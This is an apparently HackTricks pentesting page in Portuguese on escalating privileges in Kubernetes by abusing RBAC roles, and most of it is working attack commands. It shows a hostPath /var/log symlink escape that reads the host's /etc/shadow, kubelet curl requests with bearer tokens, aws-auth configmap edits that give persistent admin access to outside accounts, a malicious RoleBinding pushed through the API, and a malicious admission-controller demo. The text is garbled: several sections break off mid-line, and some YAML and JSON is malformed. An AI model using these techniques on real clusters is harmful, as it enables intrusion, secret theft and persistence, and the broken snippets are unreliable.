# Abusando de Roles/ClusterRoles no Kubernetes

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

Aqui voc√™ pode encontrar algumas configura√ß√µes de Roles e ClusterRoles potencialmente perigosas.\
Lembre-se de que voc√™ pode obter todos os recursos suportados com `kubectl api-resources`

## **Eleva√ß√£o de privil√©gios**

Referindo-se √† arte de obter **acesso a um principal diferente** dentro do cluster **com privil√©gios diferentes** (dentro do cluster Kubernetes ou para nuvens externas) do que os que voc√™ j√° tem, no Kubernetes existem basicamente **4 t√©cnicas principais para elevar privil√©gios**:

* Ser capaz de **se passar por** outros usu√°rios/grupos/SAs com melhores privil√©gios dentro do cluster Kubernetes ou para nuvens externas
* Ser capaz de **criar/patch/exec pods** onde voc√™ pode **encontrar ou anexar SAs** com melhores privil√©gios dentro do cluster Kubernetes ou para nuvens externas
* Ser capaz de **ler segredos** j√° que os tokens SAs s√£o armazenados como segredos
* Ser capaz de **escapar para o n√≥** de um cont√™iner, onde voc√™ pode roubar todos os segredos dos cont√™ineres em execu√ß√£o no n√≥, as credenciais do n√≥ e as permiss√µes do n√≥ dentro da nuvem em que est√° sendo executado (se houver)
* Uma quinta t√©cnica que merece men√ß√£o √© a capacidade de **executar port-forward** em um pod, pois voc√™ pode ser capaz de acessar recursos interessantes dentro desse pod.

### **Acessar qualquer recurso ou verbo (Wildcard)**

Este privil√©gio fornece acesso a **qualquer recurso com qualquer verbo**. √â o privil√©gio mais substancial que um usu√°rio pode obter, especialmente se esse privil√©gio tamb√©m for um "ClusterRole". Se for um "ClusterRole", o usu√°rio pode acessar os recursos de qualquer namespace e possuir o cluster com essa permiss√£o.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
```

### **Acessar qualquer recurso**

Dar permiss√£o a um usu√°rio para **acessar qualquer recurso pode ser muito arriscado**. Mas, **quais verbos** permitem o acesso a esses recursos? Aqui est√£o algumas permiss√µes RBAC perigosas que podem danificar todo o cluster:

* **resources: \["\*"] verbs: \["create"]** ‚Äì Este privil√©gio pode **criar qualquer recurso** no cluster, como **pods**, roles, etc. Um invasor pode abusar disso para **elevar privil√©gios**. Um exemplo disso pode ser encontrado na se√ß√£o **‚ÄúCria√ß√£o de Pods‚Äù**.
* **resources: \["\*"] verbs: \["list"]** ‚Äì A capacidade de listar qualquer recurso pode ser usada para **vazar segredos de outros usu√°rios** e pode tornar mais f√°cil **elevar privil√©gios**. Um exemplo disso est√° localizado na se√ß√£o **‚ÄúListagem de segredos‚Äù**.
* **resources: \["\*"] verbs: \["get"]-** Este privil√©gio pode ser usado para **obter segredos de outros service accounts**.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: api-resource-verbs-all
### **Execu√ß√£o de Pods**

**`pods/exec`** √© um recurso no Kubernetes usado para **executar comandos em um shell dentro de um pod**. Esse privil√©gio √© destinado a administradores que desejam **acessar cont√™ineres e executar comandos**. √â como criar uma sess√£o SSH para o cont√™iner.

Se tivermos esse privil√©gio, na verdade obtemos a capacidade de **assumir o controle de todos os pods**. Para fazer isso, precisamos usar o seguinte comando:

```bash
kubectl exec -it <NOME_DO_POD> -n <NAMESPACE> -- sh
```

Observe que, como voc√™ pode entrar em qualquer pod, pode abusar do token de outros pods, assim como na **explora√ß√£o de cria√ß√£o de pod** para tentar escalar privil√©gios.

### **Port-forward**

Essa permiss√£o permite **encaminhar uma porta local para uma porta no pod especificado**. Isso √© destinado a permitir a depura√ß√£o de aplicativos em execu√ß√£o dentro de um pod com facilidade, mas um invasor pode abusar disso para obter acesso a aplicativos interessantes (como bancos de dados) ou vulner√°veis (webs?) dentro de um pod:

```
kubectl port-forward pod/mypod 5000:5000
```

### **Hosts Writable /var/log/ Escape**

Como [**indicado nesta pesquisa**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), se voc√™ pode acessar ou criar um pod com o **diret√≥rio `/var/log/` do host montado** nele, voc√™ pode **escapar do cont√™iner**.\
Isso √© basicamente porque quando o **Kube-API tenta obter os logs** de um cont√™iner (usando `kubectl logs <pod>`), ele **solicita o arquivo `0.log`** do pod usando o endpoint `/logs/` do servi√ßo **Kubelet**.\
O servi√ßo Kubelet exp√µe o endpoint `/logs/`, que basicamente **exp√µe o sistema de arquivos `/var/log` do cont√™iner**.

Portanto, um invasor com **acesso de grava√ß√£o na pasta /var/log/** do cont√™iner pode abusar desses comportamentos de duas maneiras:

* Modificando o arquivo `0.log` do seu cont√™iner (geralmente localizado em `/var/logs/pods/namespace_pod_uid/container/0.log`) para ser um **link simb√≥lico apontando para `/etc/shadow`**, por exemplo. Em seguida, voc√™ poder√° exfiltrar o arquivo shadow do host fazendo:

```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Continue incrementando a cauda para exfiltrar o arquivo inteiro
```

* Se o invasor controlar qualquer principal com as **permiss√µes para ler `nodes/log`**, ele pode simplesmente criar um **link simb√≥lico** em `/host-mounted/var/log/sym` para `/` e, ao **acessar `https://<gateway>:10250/logs/sym/` ele listar√° o sistema de arquivos raiz** do host (alterar o link simb√≥lico pode fornecer acesso a arquivos).

```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```

**Um laborat√≥rio e um exploit automatizado podem ser encontrados em** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Bypassing readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Se voc√™ tiver sorte e a capacidade altamente privilegiada `CAP_SYS_ADMIN` estiver dispon√≠vel, poder√° simplesmente remontar a pasta como rw:

```bash
mount -o rw,remount /hostlogs/
```

#### Bypassing hostPath readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Conforme declarado em [**esta pesquisa**](https
### AWS EKS configmaps aws-auth

Os princ√≠pios que podem modificar **`configmaps`** no namespace kube-system em clusters EKS (precisam estar na AWS) podem obter privil√©gios de administrador do cluster sobrescrevendo o configmap **aws-auth**.\
Os verbos necess√°rios s√£o **`update`** e **`patch`**, ou **`create`** se o configmap n√£o foi criado:

{% code overflow="wrap" %}
```bash
# Verifique se o configmap existe
get configmap aws-auth -n kube-system -o yaml

## Exemplo de Yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: aws-auth
  namespace: kube-system
data:
  mapRoles: |
    - rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
      username: system:node:{{EC2PrivateDNSName}}
      groups:
        - system:masters

# Crie o configmap se ele n√£o existir
## Usando kubectl e o yaml anterior
kubectl apply -f /tmp/aws-auth.yaml
## Usando eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modifique-o
kubectl edit -n kube-system configmap/aws-auth
## Voc√™ pode modific√°-lo para dar acesso at√© mesmo a usu√°rios de outras contas
data:
  mapRoles: |
    - rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
      username: system:node:{{EC2PrivateDNSName}}
      groups:
        - system:masters
  mapUsers: |
    - userarn: arn:aws:iam::098765432123:user/SomeUserTestName
      username: admin
      groups:
        - system:masters
```
{% endcode %}

{% hint style="warning" %}
Voc√™ pode usar **`aws-auth`** para **persist√™ncia** dando acesso a usu√°rios de **outras contas**.

No entanto, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **n√£o funciona de uma conta diferente**. Mas na verdade `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` funciona se voc√™ colocar o ARN do cluster em vez de apenas o nome.\
Para fazer o `kubectl` funcionar, basta **configurar** o **kubeconfig da v√≠tima** e nos argumentos do aws exec adicionar `--profile other_account_role` para que o kubectl esteja usando o perfil da conta de outros para obter o token e entrar em contato com a AWS.
{% endhint %}

### Escalando no GKE

Existem **2 maneiras de atribuir permiss√µes K8s a princ√≠pios GCP**. Em qualquer caso, o principal tamb√©m precisa da permiss√£o **`container.clusters.get`** para poder obter credenciais para acessar o cluster, ou voc√™ precisar√° **gerar seu pr√≥prio arquivo de configura√ß√£o kubectl** (siga o pr√≥ximo link).

{% hint style="warning" %}
Ao falar com o endpoint da API K8s, o **token de autentica√ß√£o GCP ser√° enviado**. Em seguida, o GCP, por meio do endpoint da API K8s, verificar√° primeiro se o principal (por e-mail) tem algum acesso dentro do cluster, depois verificar√° se ele tem algum acesso via GCP IAM.\
Se **qualquer um** desses for **verdadeiro**, ele ser√° **respondido**. Se **n√£o**, um **erro** sugerindo dar **permiss√µes via GCP IAM** ser√° dado.
{% endhint %}

Ent√£o, o primeiro m√©todo √© usar o **GCP IAM**, as permiss√µes K8s t√™m suas **permiss√µes equivalentes do GCP IAM**, e se o principal tiver, ele poder√° us√°-las.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

O segundo m√©todo √© **atribuir permiss√µes K8s dentro do cluster** identificando o usu√°rio pelo seu **e-mail** (inclu√≠das as contas de servi√ßo GCP).

### Criar tokens de serviceaccounts

Os princ√≠pios que podem **criar TokenRequests** (`serviceaccounts/token`) podem emitir tokens para SAs equivalentes a administradores (informa√ß√µes de [**aqui**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Os princ√≠pios que podem **`update`** ou **`patch`** **`pods/ephemeralcontainers`** podem obter **execu√ß√£o de c√≥digo em outros pods**, e potencialmente **escapar** para seu n√≥ adicionando um container ef√™mero com um securityContext privilegiado.

### ValidatingWebhookConfigurations ou MutatingWebhookConfigurations

Os princ√≠pios com qualquer um dos verbos `create`, `update` ou `patch` sobre `validatingwebhookconfigurations` ou `mutatingwebhookconfigurations` podem ser capazes de **criar um desses webhookconfigurations** para poder **escalar privil√©gios**.

Para um exemplo de [`mutatingwebhookconfigurations`, verifique esta se√ß√£o deste post](./#malicious-admission-controller).

### Escalar

Como voc√™ pode ler na pr√≥xima se√ß√£o: [**Preven√ß√£o de Escalada de Privil√©gios Incorporada**](./#built-in-privileged-escalation-prevention), um principal n√£o pode atualizar nem criar fun√ß√µes ou fun√ß√µes de cluster sem ter ele mesmo essas novas permiss√µes. Exceto se ele tiver o **verbo `escalate`** sobre **`roles`** ou **`clusterroles`.**\
Ent√£o, ele pode atualizar/criar novas fun√ß√µes, clusterroles com permiss√µes melhores do que as que ele tem.

### Nodes proxy

Os princ√≠pios com acesso ao sub-recurso **`nodes/proxy`** podem **executar c√≥digo em pods** via a API Kubelet (de acordo com [**isto**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). Mais informa√ß√µes sobre autentica√ß√£o Kubelet nesta p√°gina:

{% content-ref url="../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet
### Obter e corrigir RoleBindings/ClusterRoleBindings

{% hint style="danger" %}
**Aparentemente, essa t√©cnica funcionava antes, mas de acordo com meus testes, n√£o est√° mais funcionando pelo mesmo motivo explicado na se√ß√£o anterior. Voc√™ n√£o pode criar/modificar um rolebinding para dar a si mesmo ou a outro SA alguns privil√©gios se voc√™ ainda n√£o os tiver.**
{% endhint %}

O privil√©gio de criar Rolebindings permite que um usu√°rio **vincule fun√ß√µes a uma conta de servi√ßo**. Esse privil√©gio pode levar a uma escalada de privil√©gios, porque **permite que o usu√°rio vincule privil√©gios de administrador a uma conta de servi√ßo comprometida.**

O seguinte ClusterRole est√° usando o verbo especial _bind_ que permite que um usu√°rio crie um RoleBinding com o ClusterRole _admin_ (fun√ß√£o de alto privil√©gio padr√£o) e adicione qualquer usu√°rio, incluindo ele mesmo, a esse ClusterRole de administrador.

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_with\_bind\_verb.png)

Ent√£o, √© poss√≠vel criar **`malicious-RoleBinging.json`**, que **vincula a fun√ß√£o de administrador a outra conta de servi√ßo comprometida:**

```javascript
{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "RoleBinding",
    "metadata": {
        "name": "malicious-rolebinding",
        "namespaces": "default"
    },
    "roleRef": {
        "apiGroup": "*",
        "kind": "ClusterRole",
        "name": "admin"
    },
    "subjects": [
        {
            "kind": "ServiceAccount",
            "name": "compromised-svc"
            "namespace": "default"
        }
    ]
}
```

O objetivo deste arquivo JSON √© vincular a fun√ß√£o de administrador (linha 11) √† conta de servi√ßo comprometida (linha 16).

Agora, tudo o que precisamos fazer √© enviar nosso JSON como uma solicita√ß√£o POST para a API usando o seguinte comando CURL:

```bash
curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" \ 
-H "Content-Type: application/json" \
https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
 -d @malicious-RoleBinging.json
```

Depois que a **fun√ß√£o de administrador √© vinculada √† conta de servi√ßo "compromised-svc"**, podemos usar o token da conta de servi√ßo comprometida para **listar segredos**. O seguinte comando CURL far√° isso:

```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>"\
-H "Content-Type: application/json"
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```

## Outros ataques

### Aplicativo de proxy sidecar

Por padr√£o, n√£o h√° criptografia na comunica√ß√£o entre pods. Autentica√ß√£o m√∫tua, bidirecional, pod a pod.

#### Crie um aplicativo de proxy sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Crie seu arquivo .yaml

```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```

Edite seu arquivo .yaml e adicione as linhas descomentadas:

```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
    command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
    securityContext:
      capabilities:
        add: ["NET_ADMIN"]
 #   volumeMounts:
 #   - name: sec-ctx-vol
 #     mountPath: /data/demo
 #   securityContext:
 #     allowPrivilegeEscalation: true
```

Veja os logs do proxy:

```bash
kubectl logs app -C proxy
```

Mais informa√ß√µes em: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Controlador de admiss√£o malicioso

Um controlador de admiss√£o √© um peda√ßo de c√≥digo que **intercepta solicita√ß√µes ao servidor de API do Kubernetes** antes da persist√™ncia do objeto, mas **depois que a solicita√ß√£o √© autenticada e autorizada**.

Se um invasor de alguma forma conseguir **injetar um controlador de admiss√£o de muta√ß√£o**, ele poder√° **modificar solicita√ß√µes j√° autenticadas**. Sendo capaz de potencialmente escalar privil√©gios e, mais comumente, persistir no cluster.

Exemplo de [https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):

```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```

Aguarde at√© que o servidor webhook esteja pronto. Verifique o status:

```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```

![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Depois de ter nosso webhook de muta√ß√£o malicioso em execu√ß√£o, vamos implantar um novo pod.

```bash
kubectl run nginx --image nginx
kubectl get po -w
```

Aguarde novamente, at√© ver a altera√ß√£o no status do pod. Agora, voc√™ pode ver o erro `ErrImagePull`. Verifique o nome da imagem com qualquer uma das consultas.

```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```

![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Como voc√™ pode ver na imagem acima, tentamos executar a imagem `nginx`, mas a imagem executada √© `rewanthtammana/malicious-image`. O que acabou de acontecer!!?

#### Aspectos t√©cnicos <a href="#heading-technicalities" id="heading-technicalities"></a>

Vamos desvendar o que acabou de acontecer. O script `./deploy.sh` que voc√™ executou criou um controlador de admiss√£o de webhook de muta√ß√£o. As linhas abaixo no controlador de admiss√£o de webhook de muta√ß√£o s√£o respons√°veis pelos resultados acima.

```
patches = append(patches, patchOperation{
    Op:    "replace",
    Path:  "/spec